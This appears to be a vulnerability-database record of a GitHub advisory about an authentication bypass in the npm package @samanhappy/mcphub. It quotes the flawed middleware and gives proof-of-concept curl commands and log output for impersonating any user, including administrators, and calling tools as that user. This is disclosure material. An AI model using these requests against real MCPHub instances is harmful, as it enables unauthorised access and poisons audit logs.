@@ -1,0 +1,230 @@
+advisory_id: GHSA-wf8q-wvv8-p8jf
+datasource_id: github_osv/GHSA-wf8q-wvv8-p8jf
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-wf8q-wvv8-p8jf/GHSA-wf8q-wvv8-p8jf.json
+aliases: []
+summary: |
+  @samanhappy/mcphub: SSE Endpoint Accepts Arbitrary Username from URL Path Without Authentication, Enabling User Impersonation
+  ### Summary
+
+  A critical identity spoofing vulnerability in MCPHub allows any unauthenticated user to impersonate any other user — including administrators — on SSE (Server-Sent Events) and MCP transport endpoints. The server accepts a username from the URL path parameter and creates an internal user session without any database validation, token verification, or authentication check. The source code itself acknowledges this gap with a TODO comment.
+
+  ### Details
+
+  MCPHub provides user-scoped SSE endpoints at the path `/:user/sse/:group`. The `sseUserContextMiddleware` in `src/middlewares/userContext.ts` (lines 42–75) extracts the username from `req.params.user` and constructs a fabricated `IUser` object directly, bypassing all authentication:
+
+  ```typescript
+  export const sseUserContextMiddleware = async (
+    req: Request, res: Response, next: NextFunction,
+  ): Promise<void> => {
+    const userContextService = UserContextService.getInstance();
+    const username = req.params.user;  // ← Taken directly from URL, no validation whatsoever
+
+    if (username) {
+      // Note: In a real implementation, you should validate the user exists
+      // and has proper permissions
+      const user: IUser = {
+        username,          // ← Completely attacker-controlled
+        password: '',
+        isAdmin: false,    // TODO: Should be retrieved from user database
+      };
+
+      userContextService.setCurrentUser(user);  // ← Fabricated identity is accepted as real
+      attachCleanupHandlers();
+      console.log(`User context set for SSE/MCP endpoint: ${username}`);
+      next();
+    }
+    // ...
+  };
+  ```
+
+  The SSE routes in `src/server.ts` (lines 132–161) apply only rate limiting and this context middleware — there is no authentication middleware in the chain:
+
+  ```typescript
+  // User-scoped routes with user context middleware
+  this.app.get(
+    `${this.basePath}/:user/sse/:group(.*)?`,
+    mcpConnectionRateLimiter,        // Only rate limiting
+    sseUserContextMiddleware,         // Identity from URL — no auth
+    (req, res) => handleSseConnection(req, res),
+  );
+  ```
+
+  Additionally, `UserContextService` is a **singleton** that stores the current user in a single instance variable. Under concurrent connections, one user's context can silently overwrite another's, creating a secondary race condition vulnerability (CWE-362).
+
+  ### PoC
+
+  **Prerequisites:** A running MCPHub instance with `enableBearerAuth: false` (or bearer keys not configured).
+
+  **Step 1 — Connect to the SSE endpoint as any arbitrary user:**
+  ```bash
+  curl -s -N --max-time 3 http://TARGET:3100/CEO-admin-impersonated/sse
+  ```
+
+  Expected response — a valid SSE session is created:
+  ```
+  event: endpoint
+  data: /CEO-admin-impersonated/messages?sessionId=54efc6f5-15ed-4e69-9a0e-de87d3179758
+  ```
+
+  **Step 2 — Verify on the server side (server logs):**
+  ```
+  [INFO] User context set for SSE/MCP endpoint: CEO-admin-impersonated
+  [INFO] Creating SSE transport with messages path: /CEO-admin-impersonated/messages
+  [INFO] New SSE connection established: 54efc6f5-15ed-4e69-9a0e-de87d3179758 with group: global for user: CEO-admin-impersonated
+  ```
+
+  The server accepted a completely non-existent user, created a full MCP session, and is ready to proxy tool calls under this fabricated identity. No database lookup was performed, no token was validated.
+
+  **Step 3 — Execute MCP tool calls under the spoofed identity:**
+
+  Once the SSE session is established, the attacker can send MCP messages to the returned endpoint path, executing tools under the spoofed user's context:
+  ```bash
+  curl -X POST http://TARGET:3100/CEO-admin-impersonated/messages?sessionId=54efc6f5-15ed-4e69-9a0e-de87d3179758 \
+    -H 'Content-Type: application/json' \
+    -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"any-tool","arguments":{}}}'
+  ```
+
+  ### Impact
+
+  This is a **user identity spoofing** vulnerability on the MCP transport layer. Any unauthenticated network user can:
+
+  - **Impersonate any user**, including administrators, on SSE/MCP endpoints
+  - **Execute MCP tool calls** under a spoofed user's identity, potentially accessing user-scoped resources and data
+  - **Poison audit logs** — all actions are recorded under the fabricated username, destroying accountability and forensic value
+  - **Access user-scoped servers and groups** that should only be available to authenticated users
+
+  All MCPHub instances exposing SSE endpoints without bearer authentication are affected. This includes the default configuration when bearer keys are not explicitly set up.
+
+  Reported by the Eresus Security Research Team.
+impacted_packages:
+  - purl: pkg:npm/%40samanhappy/mcphub
+    affected_versions: vers:npm/<0.12.15
+    fixed_versions: vers:npm/0.12.15
+    affected_packages:
+      - pkg:npm/%40samanhappy/mcphub@0.0.1
+      - pkg:npm/%40samanhappy/mcphub@0.0.2
+      - pkg:npm/%40samanhappy/mcphub@0.0.3
+      - pkg:npm/%40samanhappy/mcphub@0.0.4
+      - pkg:npm/%40samanhappy/mcphub@0.0.5
+      - pkg:npm/%40samanhappy/mcphub@0.0.6
+      - pkg:npm/%40samanhappy/mcphub@0.0.7
+      - pkg:npm/%40samanhappy/mcphub@0.0.8
+      - pkg:npm/%40samanhappy/mcphub@0.0.9
+      - pkg:npm/%40samanhappy/mcphub@0.0.10
+      - pkg:npm/%40samanhappy/mcphub@0.0.11
+      - pkg:npm/%40samanhappy/mcphub@0.0.12
+      - pkg:npm/%40samanhappy/mcphub@0.0.13
+      - pkg:npm/%40samanhappy/mcphub@0.0.14
+      - pkg:npm/%40samanhappy/mcphub@0.0.15
+      - pkg:npm/%40samanhappy/mcphub@0.0.16
+      - pkg:npm/%40samanhappy/mcphub@0.0.17
+      - pkg:npm/%40samanhappy/mcphub@0.0.18
+      - pkg:npm/%40samanhappy/mcphub@0.0.20
+      - pkg:npm/%40samanhappy/mcphub@0.0.21
+      - pkg:npm/%40samanhappy/mcphub@0.0.22
+      - pkg:npm/%40samanhappy/mcphub@0.0.23
+      - pkg:npm/%40samanhappy/mcphub@0.0.24
+      - pkg:npm/%40samanhappy/mcphub@0.0.25
+      - pkg:npm/%40samanhappy/mcphub@0.0.26
+      - pkg:npm/%40samanhappy/mcphub@0.0.27
+      - pkg:npm/%40samanhappy/mcphub@0.5.4
+      - pkg:npm/%40samanhappy/mcphub@0.6.0
+      - pkg:npm/%40samanhappy/mcphub@0.6.1
+      - pkg:npm/%40samanhappy/mcphub@0.6.2
+      - pkg:npm/%40samanhappy/mcphub@0.7.0
+      - pkg:npm/%40samanhappy/mcphub@0.7.1
+      - pkg:npm/%40samanhappy/mcphub@0.7.2
+      - pkg:npm/%40samanhappy/mcphub@0.7.3
+      - pkg:npm/%40samanhappy/mcphub@0.7.4
+      - pkg:npm/%40samanhappy/mcphub@0.7.5
+      - pkg:npm/%40samanhappy/mcphub@0.7.6
+      - pkg:npm/%40samanhappy/mcphub@0.7.7
+      - pkg:npm/%40samanhappy/mcphub@0.8.0
+      - pkg:npm/%40samanhappy/mcphub@0.8.1
+      - pkg:npm/%40samanhappy/mcphub@0.8.2
+      - pkg:npm/%40samanhappy/mcphub@0.8.3
+      - pkg:npm/%40samanhappy/mcphub@0.8.4
+      - pkg:npm/%40samanhappy/mcphub@0.8.5
+      - pkg:npm/%40samanhappy/mcphub@0.8.6
+      - pkg:npm/%40samanhappy/mcphub@0.8.7
+      - pkg:npm/%40samanhappy/mcphub@0.9.0
+      - pkg:npm/%40samanhappy/mcphub@0.9.1
+      - pkg:npm/%40samanhappy/mcphub@0.9.2
+      - pkg:npm/%40samanhappy/mcphub@0.9.3
+      - pkg:npm/%40samanhappy/mcphub@0.9.4
+      - pkg:npm/%40samanhappy/mcphub@0.9.5
+      - pkg:npm/%40samanhappy/mcphub@0.9.6
+      - pkg:npm/%40samanhappy/mcphub@0.9.7
+      - pkg:npm/%40samanhappy/mcphub@0.9.8
+      - pkg:npm/%40samanhappy/mcphub@0.9.9
+      - pkg:npm/%40samanhappy/mcphub@0.9.10
+      - pkg:npm/%40samanhappy/mcphub@0.9.11
+      - pkg:npm/%40samanhappy/mcphub@0.9.12
+      - pkg:npm/%40samanhappy/mcphub@0.9.13
+      - pkg:npm/%40samanhappy/mcphub@0.9.14
+      - pkg:npm/%40samanhappy/mcphub@0.9.15
+      - pkg:npm/%40samanhappy/mcphub@0.9.16
+      - pkg:npm/%40samanhappy/mcphub@0.10.0
+      - pkg:npm/%40samanhappy/mcphub@0.10.1
+      - pkg:npm/%40samanhappy/mcphub@0.10.2
+      - pkg:npm/%40samanhappy/mcphub@0.10.3
+      - pkg:npm/%40samanhappy/mcphub@0.10.4
+      - pkg:npm/%40samanhappy/mcphub@0.10.5
+      - pkg:npm/%40samanhappy/mcphub@0.10.6
+      - pkg:npm/%40samanhappy/mcphub@0.11.0
+      - pkg:npm/%40samanhappy/mcphub@0.11.1
+      - pkg:npm/%40samanhappy/mcphub@0.11.2
+      - pkg:npm/%40samanhappy/mcphub@0.11.3
+      - pkg:npm/%40samanhappy/mcphub@0.11.4
+      - pkg:npm/%40samanhappy/mcphub@0.11.5
+      - pkg:npm/%40samanhappy/mcphub@0.11.6
+      - pkg:npm/%40samanhappy/mcphub@0.11.7
+      - pkg:npm/%40samanhappy/mcphub@0.11.8
+      - pkg:npm/%40samanhappy/mcphub@0.11.9
+      - pkg:npm/%40samanhappy/mcphub@0.11.10
+      - pkg:npm/%40samanhappy/mcphub@0.11.11
+      - pkg:npm/%40samanhappy/mcphub@0.11.12
+      - pkg:npm/%40samanhappy/mcphub@0.11.13
+      - pkg:npm/%40samanhappy/mcphub@0.12.0
+      - pkg:npm/%40samanhappy/mcphub@0.12.1
+      - pkg:npm/%40samanhappy/mcphub@0.12.2
+      - pkg:npm/%40samanhappy/mcphub@0.12.3
+      - pkg:npm/%40samanhappy/mcphub@0.12.4
+      - pkg:npm/%40samanhappy/mcphub@0.12.5
+      - pkg:npm/%40samanhappy/mcphub@0.12.6
+      - pkg:npm/%40samanhappy/mcphub@0.12.7
+      - pkg:npm/%40samanhappy/mcphub@0.12.8
+      - pkg:npm/%40samanhappy/mcphub@0.12.9
+      - pkg:npm/%40samanhappy/mcphub@0.12.10
+      - pkg:npm/%40samanhappy/mcphub@0.12.11
+      - pkg:npm/%40samanhappy/mcphub@0.12.12
+      - pkg:npm/%40samanhappy/mcphub@0.12.13
+      - pkg:npm/%40samanhappy/mcphub@0.12.14
+    fixed_packages:
+      - pkg:npm/%40samanhappy/mcphub@0.12.15
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '9.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-wf8q-wvv8-p8jf/GHSA-wf8q-wvv8-p8jf.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-290
+references:
+  - url: https://github.com/samanhappy/mcphub
+    reference_type:
+    reference_id:
+  - url: https://github.com/samanhappy/mcphub/releases/tag/v0.12.15
+    reference_type:
+    reference_id:
+  - url: https://github.com/samanhappy/mcphub/security/advisories/GHSA-wf8q-wvv8-p8jf
+    reference_type:
+    reference_id:
+exploits: []
